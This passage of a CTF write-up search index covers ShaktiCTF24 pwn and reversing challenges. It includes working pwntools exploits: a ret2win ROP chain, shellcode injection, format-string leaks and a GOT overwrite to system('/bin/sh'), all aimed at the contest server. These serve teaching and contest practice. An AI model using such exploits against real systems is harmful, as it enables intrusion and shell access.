Ath3n1x Binary_Heist Easy Ath3n1x Sim Medium Ath3n1x","title":"pwn"},{"location":"ShaktiCTF24/pwn/Binary_Heist/","text":"Binary_Heist Description : Welcome Agent 007 , infiltrate the vault and succeed in the greatest binary heist in history. Author: Ath3n1x Solution : Looks like Agent 007 is back. Ok, It's checksec time: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) No PIE and Partial RELRO , so options like ret2win and got overwrite might be possible. No canary also. Now lets try running the binary: Agency: Welcome, Agent 007. Your mission is to infiltrate the enemy vault. System: Enter your name for log: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa System: Log entry successful! You will be granted access on entering the correct passcodes. Segmentation fault (core dumped) Ok so we can overflow the buffer. Lets look at the binary in ida/ghidra. There seems to be a win function called infiltrate : void infiltrate(long param_1,long param_2) { undefined8 local_16; undefined4 local_e; undefined2 local_a; local_16 = 0x6c75617620746163; local_e = 0x78742e74; local_a = 0x74; if ((param_1 == L'\\x1337c0d3') && (param_2 == L'\\xacedc0de')) { puts(\"System: Operation Binary Heist - Top-Secret Flag:\"); system((char *)&local_16); } else { puts(\"WARNING: Intruder!!!. Authorities have been warned.\"); } return; } Yep, its a ret2win with arguments. Now we can hand everything over to gdb. TODO : 1. Find offset pwndbg> cyclic -l daaaaaaa Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161) Found at offset 24 So a padding of length: 24. 2. Find suitable gadget $ ROPgadget --binary binary_heist | grep \"pop rdi\" 0x0000000000401207 : pop rdi ; pop rsi ; ret 3. Get address of win function 0x0000000000401243 infiltrate 4. Craft payload payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243) Exploit: from pwn import * def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: return remote(sys.argv[1], sys.argv[2], *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = ''' init-pwndbg b *main b *input b *infiltrate continue '''.format(**locals()) exe = './binary_heist' elf = context.binary = ELF(exe, checksec=False) context.log_level = 'debug' =========================================================== offset = b'a'*24 #io = remote(\"13.234.11.113\",31491) io = start() io.recvuntil('log:') pop_rdi_rsi_ret = 0x401207 print(elf.functions.infiltrate) #0x401243 payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243) io.sendline(payload) io.interactive() On running the script: [DEBUG] Received 0x2b bytes: b'shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}\\n' shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140} Success! Flag: shaktictf{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}","title":"Binary_Heist"},{"location":"ShaktiCTF24/pwn/Binary_Heist/#binary_heist","text":"Description : Welcome Agent 007 , infiltrate the vault and succeed in the greatest binary heist in history. Author: Ath3n1x Solution : Looks like Agent 007 is back. Ok, It's checksec time: Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) No PIE and Partial RELRO , so options like ret2win and got overwrite might be possible. No canary also. Now lets try running the binary: Agency: Welcome, Agent 007. Your mission is to infiltrate the enemy vault. System: Enter your name for log: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa System: Log entry successful! You will be granted access on entering the correct passcodes. Segmentation fault (core dumped) Ok so we can overflow the buffer. Lets look at the binary in ida/ghidra. There seems to be a win function called infiltrate : void infiltrate(long param_1,long param_2) { undefined8 local_16; undefined4 local_e; undefined2 local_a; local_16 = 0x6c75617620746163; local_e = 0x78742e74; local_a = 0x74; if ((param_1 == L'\\x1337c0d3') && (param_2 == L'\\xacedc0de')) { puts(\"System: Operation Binary Heist - Top-Secret Flag:\"); system((char *)&local_16); } else { puts(\"WARNING: Intruder!!!. Authorities have been warned.\"); } return; } Yep, its a ret2win with arguments. Now we can hand everything over to gdb. TODO : 1. Find offset pwndbg> cyclic -l daaaaaaa Finding cyclic pattern of 8 bytes: b'daaaaaaa' (hex: 0x6461616161616161) Found at offset 24 So a padding of length: 24. 2. Find suitable gadget $ ROPgadget --binary binary_heist | grep \"pop rdi\" 0x0000000000401207 : pop rdi ; pop rsi ; ret 3. Get address of win function 0x0000000000401243 infiltrate 4. Craft payload payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243) Exploit: from pwn import * def start(argv=[], *a, **kw): if args.GDB: return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw) elif args.REMOTE: return remote(sys.argv[1], sys.argv[2], *a, **kw) else: return process([exe] + argv, *a, **kw) gdbscript = ''' init-pwndbg b *main b *input b *infiltrate continue '''.format(**locals()) exe = './binary_heist' elf = context.binary = ELF(exe, checksec=False) context.log_level = 'debug' =========================================================== offset = b'a'*24 #io = remote(\"13.234.11.113\",31491) io = start() io.recvuntil('log:') pop_rdi_rsi_ret = 0x401207 print(elf.functions.infiltrate) #0x401243 payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243) io.sendline(payload) io.interactive() On running the script: [DEBUG] Received 0x2b bytes: b'shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}\\n' shaktiCTF{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140} Success! Flag: shaktictf{C0ngr4t5!_n0w_s1ng_0_b3ll4_c140}","title":"Binary_Heist"},{"location":"ShaktiCTF24/pwn/Blank_Shell/","text":"Blank_Shell Description : We meet atlast, Agent 007! I present to you the blank shell of the Egyptian Sarcophagus. Whatever you give it will be presented back to you by this special Sarcophagus. Remember, the shell maybe empty but in lies treasures untold. To your imminent victory! Author: Ath3n1x Solution : First lets check the permissions with checksec : Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Except for canary, everything else is enabled. Now lets run the program and take a look at its source. int main(int argc, char **argv) { int* addr = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); read(0, addr, 100); void (*shellcode)() = (void (*)()) addr; shellcode(); } Here you can see that the program is using the mmap system call to allocate a memory region and then reads data into this allocated memory from the standard input (stdin) before attempting to execute it as a function. shellcode(); calls the function pointed to by shellcode. Since this function pointer is set to the memory region where data was read from standard input, it attempts to execute that data as if it were a function. So in short, it creates an executable region in memory and then takes in any arbitary shellcode that the user gives and executes it. Therefore if we provide a shellcode that can spawn a shell then its imminent victory! Exploit : from pwn import * p = remote(\"13.234.11.113\", 30125) context.arch = \"amd64\" p.sendline(asm(shellcraft.sh())) p.interactive() Flag: shaktictf{sh3llc0d1ng_15_4_p13c3_0f_c4k3_9270138712038}","title":"Blank_Shell"},{"location":"ShaktiCTF24/pwn/Blank_Shell/#blank_shell","text":"Description : We meet atlast, Agent 007! I present to you the blank shell of the Egyptian Sarcophagus. Whatever you give it will be presented back to you by this special Sarcophagus. Remember, the shell maybe empty but in lies treasures untold. To your imminent victory! Author: Ath3n1x Solution : First lets check the permissions with checksec : Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Except for canary, everything else is enabled. Now lets run the program and take a look at its source. int main(int argc, char **argv) { int* addr = mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0); read(0, addr, 100); void (*shellcode)() = (void (*)()) addr; shellcode(); } Here you can see that the program is using the mmap system call to allocate a memory region and then reads data into this allocated memory from the standard input (stdin) before attempting to execute it as a function. shellcode(); calls the function pointed to by shellcode. Since this function pointer is set to the memory region where data was read from standard input, it attempts to execute that data as if it were a function. So in short, it creates an executable region in memory and then takes in any arbitary shellcode that the user gives and executes it. Therefore if we provide a shellcode that can spawn a shell then its imminent victory! Exploit : from pwn import * p = remote(\"13.234.11.113\", 30125) context.arch = \"amd64\" p.sendline(asm(shellcraft.sh())) p.interactive() Flag: shaktictf{sh3llc0d1ng_15_4_p13c3_0f_c4k3_9270138712038}","title":"Blank_Shell"},{"location":"ShaktiCTF24/pwn/Looking_Mirror/","text":"Looking_Mirror Description : Welcome brave adventurer, gaze into the immortal mirror and best it with your queries. Let it spill the much guarded secret to a masterful conquest! Author: Ath3n1x Solution : As usual, lets start with checking the permissions with checksec : Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Everything else enabled, except for canary. Now lets try running the binary: Ask the looking mirror for the secret to a masterful conquest! ============================================== Hi, you are face to face with the immortal mirror now! Delve into its eternal wisdom and get the much gaurded secret. Remember! it shall delight you with a reply, only if you are truly worthy. Otherwise it will echo your queries back to you. > hi Looking Mirror: hi > I am Ath3n1x Looking Mirror: I am Ath3n1x > As the description says, it just spits out the input. Now we will move on to examine the source code in ida/ghidra: do { printf(\"\\n> \"); fgets(local_98,0x40,stdin); printf(\"Looking Mirror: \"); printf(local_98); } while( true ); Bingo, here is the culprit! Look at the printf statement printf(local_98); , a small friend called format specifier is missing leading to format string vulnerability. Now that we found the vulnerability, lets again try running the binary and try to leak some stuff from stack. > %p %p %p %p Looking Mirror: 0x7ffd11b09970 (nil) (nil) 0x63605f4c248c > %s %s %s %s %s Looking Mirror: Looking Mirror: nil) (nil) 0x63605f4c248c (null) (null) 4t5_b4by_f0rm4773r} (null) Woah, we got something. Now, lets prepare our exploit. I had a fuzzing script ready, so I used that for this challenge since we can directly leak the flag. Exploit: from pwn import * #elf = context.binary = ELF('./looking_mirror', checksec=False) for i in range(100): try: #p = process(level='error') p = remote(\"13.234.11.113\", 31481) p.sendlineafter(b'> ', '%{}$s'.format(i).encode()) result = p.recvuntil(b'> ') print(str(i) + ': ' + str(result)) p.close() except EOFError: pass On running the script: 0: b'Looking Mirror: %0$s\\n\\n> ' 1: b'Looking Mirror: Looking Mirror: \\xe8\\x03\\n\\n> ' 2: b'Looking Mirror: (null)\\n\\n> ' 3: b'Looking Mirror: (null)\\n\\n> ' 4: b'Looking Mirror: iCTF{c0ngr4t5_b4by_f0rm4773r}\\n\\n\\n> ' 5: b'Looking Mirror: (null)\\n\\n> ' 6: b'Looking Mirror: u\\x91d*\\xfc\\x7f\\n\\n> ' 8: b'Looking Mirror: (null)\\n\\n> ' 10: b'Looking Mirror: shaktiCTF{c0ngr4t5_b4by_f0rm4773r}\\n\\n\\n> ' Got it! Flag: shaktiCTF{c0ngr4t5_b4by_f0rm4773r}","title":"Looking_Mirror"},{"location":"ShaktiCTF24/pwn/Looking_Mirror/#looking_mirror","text":"Description : Welcome brave adventurer, gaze into the immortal mirror and best it with your queries. Let it spill the much guarded secret to a masterful conquest! Author: Ath3n1x Solution : As usual, lets start with checking the permissions with checksec : Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled Everything else enabled, except for canary. Now lets try running the binary: Ask the looking mirror for the secret to a masterful conquest! ============================================== Hi, you are face to face with the immortal mirror now! Delve into its eternal wisdom and get the much gaurded secret. Remember! it shall delight you with a reply, only if you are truly worthy. Otherwise it will echo your queries back to you. > hi Looking Mirror: hi > I am Ath3n1x Looking Mirror: I am Ath3n1x > As the description says, it just spits out the input. Now we will move on to examine the source code in ida/ghidra: do { printf(\"\\n> \"); fgets(local_98,0x40,stdin); printf(\"Looking Mirror: \"); printf(local_98); } while( true ); Bingo, here is the culprit! Look at the printf statement printf(local_98); , a small friend called format specifier is missing leading to format string vulnerability. Now that we found the vulnerability, lets again try running the binary and try to leak some stuff from stack. > %p %p %p %p Looking Mirror: 0x7ffd11b09970 (nil) (nil) 0x63605f4c248c > %s %s %s %s %s Looking Mirror: Looking Mirror: nil) (nil) 0x63605f4c248c (null) (null) 4t5_b4by_f0rm4773r} (null) Woah, we got something. Now, lets prepare our exploit. I had a fuzzing script ready, so I used that for this challenge since we can directly leak the flag. Exploit: from pwn import * #elf = context.binary = ELF('./looking_mirror', checksec=False) for i in range(100): try: #p = process(level='error') p = remote(\"13.234.11.113\", 31481) p.sendlineafter(b'> ', '%{}$s'.format(i).encode()) result = p.recvuntil(b'> ') print(str(i) + ': ' + str(result)) p.close() except EOFError: pass On running the script: 0: b'Looking Mirror: %0$s\\n\\n> ' 1: b'Looking Mirror: Looking Mirror: \\xe8\\x03\\n\\n> ' 2: b'Looking Mirror: (null)\\n\\n> ' 3: b'Looking Mirror: (null)\\n\\n> ' 4: b'Looking Mirror: iCTF{c0ngr4t5_b4by_f0rm4773r}\\n\\n\\n> ' 5: b'Looking Mirror: (null)\\n\\n> ' 6: b'Looking Mirror: u\\x91d*\\xfc\\x7f\\n\\n> ' 8: b'Looking Mirror: (null)\\n\\n> ' 10: b'Looking Mirror: shaktiCTF{c0ngr4t5_b4by_f0rm4773r}\\n\\n\\n> ' Got it! Flag: shaktiCTF{c0ngr4t5_b4by_f0rm4773r}","title":"Looking_Mirror"},{"location":"ShaktiCTF24/pwn/Sim/","text":"Sim Description : Welcome back Agent 007 ! As you can see, the simulator is running an arc right now. But the arc seems to be in a meltdown. Can you break its security with its own computational power and save it? Author: Ath3n1x Solution : This seems to be the last challenge where Agent 007 will be back. You know the drill by now, Checksec : Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8046000) RUNPATH: b'.' Partial RELRO opens up the possibility of GOT overwrite. For a change, this is also a 32 bit binary contrary to the 64 bit binaries that we encountered in the challenges thus far. So the addresses are going to be 4 bytes. No PIE , which means that the addess of the GOT table remains the same. On running the binary, we can see that we have 3 options: add`, `show`, `break_armour . All manipulates the reactor which is a global array declared as: char *reactor[3][4] . Now looking at the source code: void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } idx is signed. Integer overflow is a possibility which allows negative indexing. Also, we can allocate/write anything at reactor+idx . This is particularly dangerous because we can modify the contents of the reactor array at any position specified by idx. If negative values are permitted, we could potentially overwrite critical areas of memory, such as the Global Offset Table (GOT), since both reactor and the GOT are stored in the BSS segment. By calculating the correct offset, we could overwrite a GOT entry with the address of the libc system function. This would allow us to hijack the program's execution flow and ultimately gain a shell. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } There is no check in idx . This can be exploited to print the data stored at reactor+(-idx) location. We can use the above to get more consistent libc leaks (addresses get randomized on each run due to ASLR). Then we can calculate the system address from the leaks. At last, we can overwrite GOT table entry of printf with the address (system) that we calculated. else if(choice == 3) { printf(break_); } [In main] When the choice is 3, printf(break_); gets executed. So what if break_ is /bin/sh ? Viola! There pops the shell. Note: Alternatively, you can also make use of the format string vulnerability in the printf(break_) to get the required leaks. from pwn import * #p = process(\"./sim\") p = remote('13.234.11.113',32651) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,b'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 print(\"System address:\", hex(system)) add(\"268435449\", p32(system)) #gdb.attach(p) leave() p.interactive() On running the script: [*] Switching to interactive mode Choose your ACTION: 1. add 2. show 3. break armour $ ls Dockerfile flag.txt ld-2.27.so libc-2.27.so libc.so.6 sim sim.py ynetd $ cat flag.txt shaktiCTF{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng} $ exit Flag: shaktictf{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}","title":"Sim"},{"location":"ShaktiCTF24/pwn/Sim/#sim","text":"Description : Welcome back Agent 007 ! As you can see, the simulator is running an arc right now. But the arc seems to be in a meltdown. Can you break its security with its own computational power and save it? Author: Ath3n1x Solution : This seems to be the last challenge where Agent 007 will be back. You know the drill by now, Checksec : Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8046000) RUNPATH: b'.' Partial RELRO opens up the possibility of GOT overwrite. For a change, this is also a 32 bit binary contrary to the 64 bit binaries that we encountered in the challenges thus far. So the addresses are going to be 4 bytes. No PIE , which means that the addess of the GOT table remains the same. On running the binary, we can see that we have 3 options: add`, `show`, `break_armour . All manipulates the reactor which is a global array declared as: char *reactor[3][4] . Now looking at the source code: void add(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); puts(\"Enter the data :\"); read(0,reactor[idx],0x4); } idx is signed. Integer overflow is a possibility which allows negative indexing. Also, we can allocate/write anything at reactor+idx . This is particularly dangerous because we can modify the contents of the reactor array at any position specified by idx. If negative values are permitted, we could potentially overwrite critical areas of memory, such as the Global Offset Table (GOT), since both reactor and the GOT are stored in the BSS segment. By calculating the correct offset, we could overwrite a GOT entry with the address of the libc system function. This would allow us to hijack the program's execution flow and ultimately gain a shell. void show(){ int idx; puts(\"Enter the index :\"); scanf(\"%d\",&idx); if(reactor[idx]) printf(\"%s\\n\",reactor[idx]); else puts(\"Not allocated!\"); } There is no check in idx . This can be exploited to print the data stored at reactor+(-idx) location. We can use the above to get more consistent libc leaks (addresses get randomized on each run due to ASLR). Then we can calculate the system address from the leaks. At last, we can overwrite GOT table entry of printf with the address (system) that we calculated. else if(choice == 3) { printf(break_); } [In main] When the choice is 3, printf(break_); gets executed. So what if break_ is /bin/sh ? Viola! There pops the shell. Note: Alternatively, you can also make use of the format string vulnerability in the printf(break_) to get the required leaks. from pwn import * #p = process(\"./sim\") p = remote('13.234.11.113',32651) def add(idx,data): p.sendlineafter(\"MELTDOWN)\\n\",\"1\") p.sendlineafter(\"index :\\n\",str(idx)) p.sendlineafter(\"data :\\n\",data) def show(idx): p.sendlineafter(\"MELTDOWN)\\n\",\"2\") p.sendlineafter(\"Enter the index :\\n\",str(idx)) def leave(): p.sendlineafter(\"MELTDOWN)\\n\",\"3\") p.sendline(\"/bin/sh\\x00\") show(\"268435454\") print(\"leaks:\") leak = u32(p.recvline()[:4].strip().ljust(4,b'\\x00')) print(hex(leak)) base = leak - 0x1d55c0 system = base + 0x3ce10 print(\"System address:\", hex(system)) add(\"268435449\", p32(system)) #gdb.attach(p) leave() p.interactive() On running the script: [*] Switching to interactive mode Choose your ACTION: 1. add 2. show 3. break armour $ ls Dockerfile flag.txt ld-2.27.so libc-2.27.so libc.so.6 sim sim.py ynetd $ cat flag.txt shaktiCTF{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng} $ exit Flag: shaktictf{Th3_4rc_15_s4v3d_4nd_h4ppy_pwn1ng}","title":"Sim"},{"location":"ShaktiCTF24/reversing/","text":"Reverse Engineering Challenge Name Level Author Warmup_rev Beginner k1n0r4 Cyber_Kingdom Easy k1n0r4 Operation_Ultra Easy k1n0r4 NotBabyRev Medium k1n0r4 Twisted_Calc Hard k1n0r4","title":"Reverse Engineering"},{"location":"ShaktiCTF24/reversing/#reverse-engineering","text":"Challenge Name Level Author Warmup_rev Beginner k1n0r4 Cyber_Kingdom Easy k1n0r4 Operation_Ultra Easy k1n0r4 NotBabyRev Medium k1n0r4 Twisted_Calc Hard k1n0r4","title":"Reverse Engineering"},{"location":"ShaktiCTF24/reversing/Cyber_Kingdom/","text":"Cyber_Kingdom Description Break through the kingdom ! Author: k1n0r4 Difficulty level: Easy Points: 200 Category: Reverse Engineering Solution We quickly find that the binary is using rand and srand . The man page states the following for srand . The srand() function sets its argument as the seed for a new sequence of pseudo-random integers to be returned by rand(). These sequences are repeatable by calling srand() with the same seed value. So here the srand is set to 123. In each iteration, the AND operation is performed on the result of rand() with 15 (this operation sets the result to the lowest 4 bits of the original number), and the outcome is stored in v8. Subsequently, this value is XORed with each character of the input provided. Through a loop, the program checks if the result matches the values stored in v9. By XORing the rand() values with the given decimals, the flag is derived. #include <stdio.h> #include <stdlib.h> int main() { int i,j,k; int v8[36]; char s[40]; srand(123); for (i = 0; i <= 34; ++i) v8[i] = rand() & 0xF; int v9[35] = {114,109,96,101,115,98,104,122, 108, 122, 119, 100,49,84,119,49,108,99,89,103,98,49,108,88,49,125,83,126,59,98,105,48,108,49,114}; for (j = 0; j <= 34; ++j) s[j]=v9[j]^v8[j]; printf(\"%s\",s);} Flag shaktictf{wh0_s4id_fl4g_1s_r4nd0m?}","title":"Cyber_Kingdom"},{"location":"ShaktiCTF24/reversing/Cyber_Kingdom/#cyber_kingdom","text":"","title":"Cyber_Kingdom"},{"location":"ShaktiCTF24/reversing/Cyber_Kingdom/#description","text":"Break through the kingdom ! Author: k1n0r4 Difficulty level: Easy Points: 200 Category: Reverse Engineering","title":"Description"},{"location":"ShaktiCTF24/reversing/Cyber_Kingdom/#solution","text":"We quickly find that the binary is using rand and srand . The man page states the following for srand . The srand() function sets its argument as the seed for a new sequence of pseudo-random integers to be returned by rand(). These sequences are repeatable by calling srand() with the same seed value. So here the srand is set to 123. In each iteration, the AND operation is performed on the result of rand() with 15 (this operation sets the result to the lowest 4 bits of the original number), and the outcome is stored in v8. Subsequently, this value is XORed with each character of the input provided. Through a loop, the program checks if the result matches the values stored in v9. By XORing the rand() values with the given decimals, the flag is derived. #include <stdio.h> #include <stdlib.h> int main() { int i,j,k; int v8[36]; char s[40]; srand(123); for (i = 0; i <= 34; ++i) v8[i] = rand() & 0xF; int v9[35] = {114,109,96,101,115,98,104,122, 108, 122, 119, 100,49,84,119,49,108,99,89,103,98,49,108,88,49,125,83,126,59,98,105,48,108,49,114}; for (j = 0; j <= 34; ++j) s[j]=v9[j]^v8[j]; printf(\"%s\",s);}","title":"Solution"},{"location":"ShaktiCTF24/reversing/Cyber_Kingdom/#flag","text":"shaktictf{wh0_s4id_fl4g_1s_r4nd0m?}","title":"Flag"},{"location":"ShaktiCTF24/reversing/NotBabyRev/","text":"NotBabyRev Description I love challenges !! Here is a Real Task for you. Author: k1n0r4 Difficulty level: Medium Points: 300 Category: Reverse Engineering Solution The given file is a windows executable but on using a decompiler to decompile this binary does not give us much information. On executing the file, we get an interface which looks like this So well, this is a flag checker. Let's try to analyse the source code of this binary. Performing strings on the executable, gives up the output something like this This indicates towards the fact that the executable is UPX packed . Unpack the binary using UPX and view it in a decompiler. One easy way to go the main crux of the windows binaries is using strings and find the location of the crucial strings Here we find quite a lot of interesting strings, which can lead us to the important functions of the binary. Well, seems like we found an important function sub_140011BF0 Input is taken via the api GetWindowTextA into the variable Src . Function sub_1400110BE seems some sort of check for it to print the win statement \"Congratulations!!!\" On entering that function, we find the following operations being performed on the input taken Flag length check to be 36 Characters at odd index number are xorred with 0x38 and stored in a new array v8 Subtract 5 from each of the characters Convert the entire input of length 36 to 6X6 matrix 4 Swaps Swap 1: 1st and 4th row Swap 2: 2nd and 5th column Swap 3: 2nd and 6th row Swap 4: 3rd and 4th column Some constraints performed on the manipulated input These constraints can be solved using a constraint solver called z3. Solution Script Here is the entire script - from z3 import * matr = [[Int(f'matr_{i}_{j}') for j in range(6)] for i in range(6)] sol = Solver() sol.add(matr[2][4] + matr[1][0] - matr[3][0] == 106) sol.add(matr[5][2] + matr[1][4] - matr[4][5] == 174) sol.add(matr[0][2] + matr[5][4] - matr[2][5] == 111) sol.add(matr[3][0] + matr[2][2] - matr[4][4] == 19) sol.add(matr[1][3] + matr[3][5] - matr[0][2] == 16) sol.add(matr[3][3] + matr[0][1] - matr[4][3] == 75) sol.add(matr[0][5] + matr[4][2] - matr[1][0] == 111) sol.add(matr[2][1] + matr[3][2] - matr[5][3] == 83) sol.add(matr[1][2] + matr[4][3] - matr[4][2] == 113) sol.add(matr[3][2] + matr[0][2] - matr[0][5] == 89) sol.add(matr[4][2] + matr[2][5] - matr[5][5] == 141) sol.add(matr[1][0] + matr[0][5] - matr[2][3] == 115) sol.add(matr[2][2] + matr[4][5] - matr[5][1] == 18) sol.add(matr[5][0] + matr[4][1] - matr[0][3] == 155) sol.add(matr[0][0] + matr[3][3] - matr[3][1] == 84) sol.add(matr[3][4] + matr[1][1] - matr[2][1] == 31) sol.add(matr[1][5] + matr[2][3] - matr[4][0] == 187) sol.add(matr[4][3] + matr[0][3] - matr[1][1] == 102) sol.add(matr[0][4] + matr[2][1] - matr[5][2] == 51) sol.add(matr[2][5] + matr[4][4] - matr[2][2] == 141) sol.add(matr[1][4] + matr[3][1] - matr[0][0] == 102) sol.add(matr[5][5] + matr[3][4] - matr[3][2] == 40) sol.add(matr[0][1] + matr[4][0] - matr[2][0] == 22) sol.add(matr[4][4] + matr[1][5] - matr[1][2] == 109) sol.add(matr[3][5] + matr[3][0] - matr[4][1] == 95) sol.add(matr[1][1] + matr[0][0] + matr[5][4] == 184) sol.add(matr[4][1] + matr[2][0] - matr[0][1] == 60) sol.add(matr[3][1] + matr[1][2] - matr[3][3] == 96) sol.add(matr[5][3] + matr[5][0] - matr[1][4] == 73) sol.add(matr[0][3] + matr[5][5] + matr[5][0] == 135) sol.add(matr[4][5] + matr[2][4] - matr[1][3] == 130) sol.add(matr[2][3] + matr[1][3] + matr[3][4] == 179) sol.add(matr[5][4] + matr[5][1] - matr[0][4] == 87) sol.add(matr[2][0] + matr[0][4] - matr[2][4] == 83) sol.add(matr[5][1] + matr[5][3] - matr[3][5] == 64) sol.add(matr[0][0] + matr[0][1] + matr[0][2] + matr[0][3] + matr[0][4] + matr[0][5] == 458) sol.add(matr[1][0] + matr[1][1] + matr[1][2] + matr[1][3] + matr[1][4] + matr[1][5] == 425) sol.add(matr[2][0] + matr[2][1] + matr[2][2] + matr[2][3] + matr[2][4] + matr[2][5] == 445) sol.add(matr[3][0] + matr[3][1] + matr[3][2] + matr[3][3] + matr[3][4] + matr[3][5] == 526) sol.add(matr[4][0] + matr[4][1] + matr[4][2] + matr[4][3] + matr[4][4] + matr[4][5] == 418) sol.add(matr[5][0] + matr[5][1] + matr[5][2] + matr[5][3] + matr[5][4] + matr[5][5] == 522) sol.add(matr[0][0] + matr[1][0] + matr[2][0] + matr[3][0] + matr[4][0] + matr[5][0] == 394) sol.add(matr[0][1] + matr[1][1] + matr[2][1] + matr[3][1] + matr[4][1] + matr[5][1] == 382) sol.add(matr[0][2] + matr[1][2] + matr[2][2] + matr[3][2] + matr[4][2] + matr[5][2] == 560) sol.add(matr[0][3] + matr[1][3] + matr[2][3] + matr[3][3] + matr[4][3] + matr[5][3] == 357) sol.add(matr[0][4] + matr[1][4] + matr[2][4] + matr[3][4] + matr[4][4] + matr[5][4] == 599) sol.add(matr[0][5] + matr[1][5] + matr[2][5] + matr[3][5] + matr[4][5] + matr[5][5] == 502) if sol.check() == sat: model = sol.model() result_matrix = [[model.evaluate(matr[i][j]) for j in range(6)] for i in range(6)] print(\"Satisfiable solution found:\") else: print(\"No satisfiable solution found.\") matrix = [[0 for j in range(6)] for i in range(6)] for i in range(6): for j in range(6): matrix[i][j] = result_matrix[i][j].as_long() for row in matrix: print(row) for i in range(6): matrix[i][2],matrix[i][3] = matrix[i][3],matrix[i][2] for j in range(6): matrix[1][j],matrix[5][j] = matrix[5][j],matrix[1][j] for k in range(6): matrix[k][1],matrix[k][4] = matrix[k][4],matrix[k][1] for a in range(6): matrix[0][a],matrix[3][a] = matrix[3][a],matrix[0][a] for b in range(36): matrix[b//6][b%6] += 5 for x in range(36): if x % 2 == 0: print(chr(matrix[x//6][x%6] ^ 0x38),end='') else: print(chr(matrix[x//6][x%6]),end='') Flag shaktictf{h0w_w4s_th3_fl4g_ch3ck3r?}","title":"NotBabyRev"},{"location":"ShaktiCTF24/reversing/NotBabyRev/#notbabyrev","text":"","title":"NotBabyRev"},{"location":"ShaktiCTF24/reversing/NotBabyRev/#description","text":"I love challenges !! Here is a Real Task for you. Author: k1n0r4 Difficulty level: Medium Points: 300 Category: Reverse Engineering","title":"Description"},{"location":"ShaktiCTF24/reversing/NotBabyRev/#solution","text":"The given file is a windows executable but on using a decompiler to decompile this binary does not give us much information. On executing the file, we get an interface which looks like this So well, this is a flag checker. Let's try to analyse the source code of this binary. Performing strings on the executable, gives up the output something like this This indicates towards the fact that the executable is UPX packed . Unpack the binary using UPX and view it in a decompiler. One easy way to go the main crux of the windows binaries is using strings and find the location of the crucial strings Here we find quite a lot of interesting strings, which can lead us to the important functions of the binary. Well, seems like we found an important function sub_140011BF0 Input is taken via the api GetWindowTextA into the variable Src . Function sub_1400110BE seems some sort of check for it to print the win statement \"Congratulations!!!\" On entering that function, we find the following operations being performed on the input taken Flag length check to be 36 Characters at odd index number are xorred with 0x38 and stored in a new array v8 Subtract 5 from each of the characters Convert the entire input of length 36 to 6X6 matrix 4 Swaps Swap 1: 1st and 4th row Swap 2: 2nd and 5th column Swap 3: 2nd and 6th row Swap 4: 3rd and 4th column Some constraints performed on the manipulated input These constraints can be solved using a 